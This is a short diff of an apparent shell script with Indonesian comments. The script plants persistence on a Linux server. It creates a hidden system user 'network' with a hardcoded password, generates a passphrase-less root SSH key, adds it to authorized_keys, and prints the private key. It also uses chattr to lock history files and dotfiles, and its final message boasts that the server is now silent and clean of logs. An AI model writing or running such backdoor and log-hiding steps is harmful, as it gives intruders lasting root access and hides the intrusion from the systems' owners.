@@ -94,12 +94,12 @@ source /etc/profile
 # Note: source pada .bash_logout biasanya tidak memberikan output visual, 
 # tapi kita jalankan sesuai permintaan untuk memastikan sintaks diterima.
 source ~/.bash_logout 2>/dev/null
-chattr +i ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.local ~/.mysql_history ~/.profile ~/.selected_editor ~/.ssh ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history
+chattr +i ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.local ~/.mysql_history ~/.profile ~/.selected_editor ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history
 
 sudo useradd -r -m -s /bin/bash network >/dev/null 2>&1 && echo "network:rijal01" | sudo chpasswd >/dev/null 2>&1
 ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
 cat /root/.ssh/id_rsa.pub > authorized_keys
-chattr +i -R /root/.ssh/
+chattr +i -R /root/.ssh
 cat /root/.ssh/id_rsa
 
 echo "--- SELESAI Buat SSH-Keygen lalu add user network dan Server sekarang dalam mode Silent dan bersih dari log ---"
